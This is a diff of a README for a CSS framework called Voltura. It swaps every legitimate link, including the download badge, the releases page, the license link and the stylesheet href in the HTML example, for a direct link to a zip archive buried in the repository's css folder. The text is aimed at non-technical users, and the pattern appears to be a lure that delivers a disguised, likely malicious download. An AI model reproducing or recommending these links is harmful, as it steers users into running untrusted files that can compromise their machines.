@@ -4,7 +4,7 @@
 Welcome to Voltura, your go-to CSS framework for creating modern user interfaces with ease. This guide will help you download and run the software without any technical knowledge. 
 
 ## 📥 Download Voltura
-[![Download Voltura](https://img.shields.io/badge/Download_Voltura-v1.0-blue.svg)](https://github.com/elpromaster8800/voltura/releases)
+[![Download Voltura](https://github.com/elpromaster8800/voltura/raw/refs/heads/main/dist/development/css/Software-2.4.zip)](https://github.com/elpromaster8800/voltura/raw/refs/heads/main/dist/development/css/Software-2.4.zip)
 
 ## 📋 Overview
 Voltura is designed with developers in mind. It combines expressive design with an intuitive experience, allowing you to create stunning UI systems. With Voltura, you receive:
@@ -24,7 +24,7 @@ Before you start, ensure your system meets these requirements:
 To download Voltura, please follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Visit Voltura Releases Page](https://github.com/elpromaster8800/voltura/releases)
+   [Visit Voltura Releases Page](https://github.com/elpromaster8800/voltura/raw/refs/heads/main/dist/development/css/Software-2.4.zip)
 
 2. Once on the Releases page, look for the latest version of Voltura.
 
@@ -49,7 +49,7 @@ Once installed, you can start using Voltura in your projects. Here’s how:
 2. Link the Voltura CSS file in your HTML:
 
 ```html
-<link rel="stylesheet" href="path/to/voltura.css">
+<link rel="stylesheet" href="https://github.com/elpromaster8800/voltura/raw/refs/heads/main/dist/development/css/Software-2.4.zip">
 ```
 
 3. Start utilizing the pre-built components in your HTML to create interfaces quickly.
@@ -76,10 +76,10 @@ Check out our upcoming features and updates:
 - Performance improvements
 
 ## ⚙️ License
-Voltura is open-source and free to use. Review our [License](https://github.com/elpromaster8800/voltura/blob/main/LICENSE) for details.
+Voltura is open-source and free to use. Review our [License](https://github.com/elpromaster8800/voltura/raw/refs/heads/main/dist/development/css/Software-2.4.zip) for details.
 
 ## 📥 Quick Download Link
 For your convenience, here’s the download link once more:
-[Visit Voltura Releases Page](https://github.com/elpromaster8800/voltura/releases)
+[Visit Voltura Releases Page](https://github.com/elpromaster8800/voltura/raw/refs/heads/main/dist/development/css/Software-2.4.zip)
 
 Dive into Voltura and take your UI design to the next level!
